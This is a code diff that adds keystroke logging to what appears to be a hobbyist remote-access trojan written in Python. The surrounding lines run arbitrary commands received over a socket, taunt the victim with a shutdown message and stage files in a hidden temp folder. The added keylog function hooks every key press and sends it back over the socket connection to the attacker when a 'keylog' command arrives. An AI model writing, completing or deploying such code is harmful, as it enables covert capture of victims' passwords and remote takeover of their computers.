@@ -7,6 +7,7 @@
 #twitter: @rossin135
 #github: https://github.com/rossiniroberto52
 import socket, os, subprocess, webbrowser, shutil
+import keyboard as key
 from getpass import getuser
 from pathlib import Path
 from os import path
@@ -17,6 +18,13 @@ USER = getuser()
 
 #used PATHS:
 temp_path = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
+
+def keylog(event):
+    keys = []
+    key = event.name
+    keys.append(key)
+    keyToSend = keys
+    conn.send(str(keyToSend + ", ").encode("utf-8"))
 
 def kill():
     os.system("msg %username% your system will be shutdown because i hack then :) lol")
@@ -66,6 +74,9 @@ while True:
         clone()
         kill()
         #re-start the server
+    if cmd == "keylog":
+        key.on_press(keylog)
+        key.wait('esc')
 # Kstay shutdown the sistem. stay dont shutdown
     os.system(cmd)
     output = subprocess.getoutput(cmd)
